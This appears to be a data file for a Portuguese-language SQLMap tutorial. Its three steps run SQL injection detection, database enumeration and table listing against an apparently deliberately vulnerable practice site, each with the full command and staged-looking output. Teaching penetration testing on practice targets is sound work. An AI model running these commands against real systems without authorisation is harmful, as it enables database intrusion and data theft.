
export const data = {
    id: "sqlmap",
    title: "SQLMap: Injeção de SQL Automática",
    intro: "O SQLMap é uma ferramenta de teste de penetração open source que automatiza o processo de detecção e exploração de falhas de injeção de SQL e tomada de controle de servidores de banco de dados.",
    steps: [
        {
            step: 1,
            instruction: "Vamos testar uma URL vulnerável para ver se o SQLMap detecta o parâmetro 'id' como injetável.",
            command: "sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --batch",
            hint: "A flag -u define a URL e --batch aceita as perguntas padrão automaticamente.",
            output: `        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.12#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter 'artist' is dynamic
[INFO] GET parameter 'artist' appears to be dynamic
[INFO] GET parameter 'artist' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.0.12`
        },
        {
            step: 2,
            instruction: "Confirmada a vulnerabilidade, vamos listar os bancos de dados disponíveis no servidor.",
            command: "sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs --batch",
            hint: "Use a flag --dbs para enumerar os bancos.",
            output: `[INFO] the back-end DBMS is MySQL
[INFO] fetching database names
available databases [2]:
[*] information_schema
[*] acuart`
        },
        {
            step: 3,
            instruction: "Agora, vamos extrair as tabelas do banco de dados 'acuart'.",
            command: "sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables --batch",
            hint: "Use -D para definir o banco e --tables para listar tabelas.",
            output: `[INFO] the back-end DBMS is MySQL
[INFO] fetching tables for database: 'acuart'
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+`
        }
    ]
};
